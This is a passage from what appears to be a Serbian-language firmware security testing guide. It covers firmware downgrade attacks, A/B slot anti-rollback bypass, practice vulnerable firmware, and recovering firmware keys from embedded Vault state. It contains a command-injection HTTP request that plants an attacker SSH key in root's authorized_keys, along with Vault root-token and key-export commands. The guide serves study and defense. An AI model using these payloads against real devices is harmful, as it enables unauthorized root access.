- **Shellcode preko `/proc/self/mem`:** ROP chain koji poziva `open("/proc/self/mem")`, `lseek()` i `write()` može da postavi izvršivi shellcode u poznato mapiranje i skoči na njega.

## Pripremljeni operativni sistemi za analizu firmware-a

Operativni sistemi kao što su [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) nude unapred konfigurisana okruženja za testiranje bezbednosti firmware-a, opremljena potrebnim alatima.

## Pripremljeni OS-ovi za analizu firmware-a

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distribucija namenjena bezbednosnoj proceni i penetration testing-u IoT (Internet of Things) uređaja. Štedi vam mnogo vremena tako što pruža unapred konfigurisano okruženje sa svim potrebnim alatima.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operativni sistem zasnovan na Ubuntu 18.04 za testiranje bezbednosti embedded sistema, sa unapred instaliranim alatima za testiranje bezbednosti firmware-a.

## Firmware downgrade napadi i nebezbedni mehanizmi ažuriranja

Čak i kada proizvođač implementira kriptografske provere potpisa za firmware image-e, **zaštita od vraćanja na stariju verziju (downgrade) često izostaje**. Kada boot ili recovery loader proverava samo potpis pomoću ugrađenog javnog ključa, ali ne upoređuje *verziju* (ili monotoni brojač) image-a koji se flešuje, napadač može legitimno da instalira **stariji, ranjivi firmware sa i dalje važećim potpisom** i tako ponovo uvede zakrpljene ranjivosti.<sup>[[4]](#references)</sup>

Tipičan tok napada:

1. **Nabavite stariji potpisani image**
   * Preuzmite ga sa javnog portala za preuzimanje, CDN-a ili stranice za podršku proizvođača.
   * Izvucite ga iz pratećih mobilnih/desktop aplikacija (npr. iz `assets/firmware/` unutar Android APK-a).
   * Pronađite ga u repozitorijumima trećih strana, kao što su VirusTotal, Internet arhive, forumi itd.
2. **Otpremite image na uređaj ili ga učinite dostupnim uređaju** preko bilo kog izloženog kanala za ažuriranje:
   * Web UI, API mobilne aplikacije, USB, TFTP, MQTT itd.
   * Mnogi IoT uređaji za potrošače izlažu *neautentifikovane* HTTP(S) endpoint-e koji prihvataju Base64-kodirane firmware blob-ove, dekodiraju ih na strani servera i pokreću recovery/upgrade.
3. Nakon downgrade-a, iskoristite ranjivost koja je zakrpljena u novijem izdanju (na primer filter za command injection koji je dodat kasnije).
4. Po želji ponovo flešujte najnoviji image ili onemogućite ažuriranja kako biste izbegli otkrivanje nakon uspostavljanja persistence-a.

### Primer: Command Injection nakon downgrade-a

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

U ranjivom firmware-u (vraćenom na stariju verziju), parametar `md5` direktno se konkatenira u shell komandu bez sanitizacije, što omogućava ubacivanje proizvoljnih komandi (ovde — omogućavanje root pristupa zasnovanog na SSH ključu). Kasnije verzije firmware-a uvele su osnovni filter znakova, ali zbog odsustva zaštite od vraćanja na stariju verziju, ispravka je beskorisna.<sup>[[4]](#references)</sup>

### Izdvajanje firmware-a iz mobilnih aplikacija

Mnogi proizvođači uključuju potpune slike firmware-a u prateće mobilne aplikacije kako bi aplikacija mogla da ažurira uređaj preko Bluetooth/Wi-Fi veze. Ovi paketi se obično čuvaju nešifrovani u APK/APEX datotekama, na putanjama kao što su `assets/fw/` ili `res/raw/`. Alati kao što su `apktool`, `ghidra` ili čak obični `unzip` omogućavaju izdvajanje potpisanih slika bez pristupa fizičkom hardveru.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Zaobilaženje zaštite od vraćanja na stariju verziju samo u updater-u kod dizajna sa A/B slotovima

Neki vendori implementiraju **mehanizam protiv vraćanja na stariju verziju** (*ratchet*), ali samo unutar logike *updater*-a (na primer, UDS rutinu preko CAN-a, komandu za oporavak ili OTA agent u userspace-u). Ako **bootloader** kasnije proverava samo potpis/CRC slike i veruje tabeli particija ili metapodacima slota, zaštita od vraćanja na stariju verziju i dalje može da se zaobiđe.<sup>[[7]](#references)</sup>

Tipičan slab dizajn:

- Metapodaci firmvera sadrže i deskriptor verzije i **bezbednosni brojač** (*ratchet*) / monotoni brojač.
- Updater upoređuje brojač slike sa vrednošću sačuvanom u trajnom skladištu i odbija starije potpisane slike.
- Bootloader **ne** parsira taj brojač i pre pokретања выбраног slota проверава само заглавље, CRC и потпис.
- Активирање слота чува се одвојено, у табели партиција или бројачу генерација за сваки слот, и није криптографски повезано са тачним хешом фирмвера који је проверен.

Ово у системима са два слота омогућава примитив **провери једну слику / покрени другу слику**. Ако нападач може да наведе updater да означи слот B као следећи циљ покретања користећи актуелну потписану слику, а затим да препише слот B пре поновног покретања, bootloader и даље може да покрене старију слику јер верује само већ потврђеним метаподацима слота.

Уобичајени образац злоупотребе:

1. Отпремите **актуелни потписани** фирмвер у пасивни слот и покрените уобичајену рутину за проверу/пребацивање, тако да распоред означи тај слот као следећи активни.
2. **Немојте још да покрећете уређај поново**. Поново уђите у рутину за припрему/брисање слота у истој сесији.
3. Злоупотребите застарело стање покретања или логику избора слота тако да updater избрише **исти физички слот** који је управо промовисан.
4. Упишите **старији, али и даље потписани** фирмвер у тај слот.
5. Прескочите рутину за проверу којом се спроводи *ratchet* и директно поново покрените уређај.
6. Bootloader изабере промовисани слот, провери само потпис/интегритет и покрене стару слику.

Шта треба тражити при анализи имплементација A/B ажурирања:

- Избор слота изведен из **заставица при покретању** које се не освежавају после успешног пребацивања.
- Рутина типа `prepare_passive_slot()` која брише слот на основу застарелог стања уместо **тренутног потврђеног распореда**.
- Функција типа `part_write_layout()` која само повећава **бројач генерације** / активну заставицу и не чува хеш проверене слике.
- Провере *ratchet*-а имплементиране у userspace-у или коду updater-а, али **не** у ROM-у / bootloader-у / фазама secure boot-а.
- Рутине за брисање или опоравак које остављају слот означеним као покретљив чак и након што је његов садржај избрисан и поново уписан.

### Листа за проверу логике ажурирања

* Да ли је транспорт/аутентификација *update endpoint*-а адекватно заштићена (TLS + аутентификација)?
* Да ли уређај пре уписивања пореди **бројеве верзија** или **монотони бројач заштите од враћања на старију верзију**?
* Да ли се слика проверава унутар ланца secure boot-а (нпр. да ли ROM код проверава потписе)?
* Да ли **bootloader спроводи исти ratchet** као updater, уместо да проверава само потпис/CRC?
* Да ли су метаподаци о активирању слота **повезани са провереним хешом/верзијом фирмвера**, или слот може да се измени након промоције?
* Након успешног пребацивања слота, да ли је уређај приморан да се поново покрене или су касније рутине за ажурирање/брисање и даље доступне у истој сесији?
* Да ли код у userland-у обавља додатне провере исправности (нпр. дозвољена мапа партиција, број модела)?
* Да ли *делимични* или *резервни* токови ажурирања поново користе исту логику за проверу?

> 💡  Ако било шта од наведеног недостаје, платформа је вероватно рањива на нападе враћањем на старију верзију.

## Рањиви фирмвер за вежбу

За вежбање откривања рањивости у фирмверу, као полазну тачку користите следеће пројекте рањивог фирмвера.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- Пројекат Damn Vulnerable Router Firmware
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Враћање кључева за дешифровање фирмвера из уграђеног KMS/Vault стања

Када слика ажурирања комбинује мале метаподатке у отвореном тексту са великим блоком података високе ентропије, прво анализирајте контејнер пре него што покушате било шта да разбијете грубом силом:<sup>[[1]](#references)</sup>

- Избаците заглавља, помераје и границе редова помоћу `hexdump`, `xxd`, `strings -tx`, `base64 -d` и `binwalk -E`.
- `Salted__` обично означава OpenSSL `enc` формат: следећих 8 бајтова су salt, а преостали бајтови су шифровани текст.
- Base64 поље које се декодира у тачно `256` бајтова снажан је показатељ да је у питању RSA-2048 шифровани текст који садржи насумичну лозинку за фирмвер/кључ сесије.
- Одвојени PGP материјал у истој датотеци често штити само аутентичност; немојте претпоставити да се користи за поверљивост.

Ако тражење статичких кључева (`grep`, `strings`, PEM/PGP претраге) не успе, анализирајте **оперативни пут дешифровања** уместо да тражите само приватне кључеве:

- Декомпајлирајте updater / бинарни фајл за управљање и пратите ко чита шифровани блок, који помоћни алат/API га распакује и који логички назив кључа се тражи.
- Претражите издвојени root фајл-систем за KMS стање (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), као и unit датотеке и init скрипте.
- Третирајте отворени текст `vault operator unseal ...`, кључеве за опоравак, bootstrap токене или локалне KMS скрипте за аутоматско отпечаћивање као материјал еквивалентан приватним кључевима.

Ако уређај садржи оригинални Vault бинарни фајл и позадинско складиште, обично је лакше поново покренути то окружење него поново имплементирати унутрашњи рад Vault-а:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Sa root pristupom na kloniranom KMS-u:

- Učinite transit ključeve izvozivim samo unutar izolovanog klona: `vault write transit/keys/<name>/config exportable=true`
- Izvezite ključ za unwrap: `vault read transit/export/encryption-key/<name>`
- Isprobajte oporavljeni RSA ključ sa tačnim parom padding/hash koji koristi KMS. Neuspešan PKCS#1 v1.5 decrypt i neuspešan podrazumevani OAEP decrypt **ne** dokazuju da je ključ pogrešan; mnogi tokovi zasnovani na Vault-u koriste OAEP sa SHA-256, dok su uobičajene biblioteke podrazumevano podešene na SHA-1.
- Ako payload počinje sa `Salted__`, tačno ponovite OpenSSL KDF dobavljača (`EVP_BytesToKey`, često MD5 na starijim uređajima) pre nego što pokušate AES-CBC decryption.

Tako „šifrovani firmware“ postaje opštiji problem: **oporavite operativne ključeve sa strane uređaja, a zatim van mreže ponovite tačne parametre unwrap + KDF**.

## Obuke i sertifikati

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Razbijanje firmware-a pomoću Claude-a: veštine na seniorskom nivou, autonomija na juniorskom nivou](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologija testiranja bezbednosti firmware-a](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktično IoT hakovanje: Definitivni vodič za napade na Internet stvari](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Iskorišćavanje zero-day ranjivosti u napuštenom hardveru – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Kako mi je pametni uređaj od 20 dolara omogućio pristup vašem domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sada vidiš mi: sada si pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Iskorišćavanje Tesla Wall Connector-a preko priključka za punjenje - 2. deo: zaobilaženje zaštite od vraćanja na stariju verziju](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Neka zatreperi: Iskorišćavanje Philips Hue Bridge-a putem OTA ažuriranja](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS na QEMU, 2. deo: otklanjanje grešaka i ispravke](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [10] [Dell BIOS lozinke: slabo XOR šifrovanje omogućava oporavak iz SPI flash-a (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [11] [R3n5k1/dellpwn - alati za oporavak Dell BIOS lozinki](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
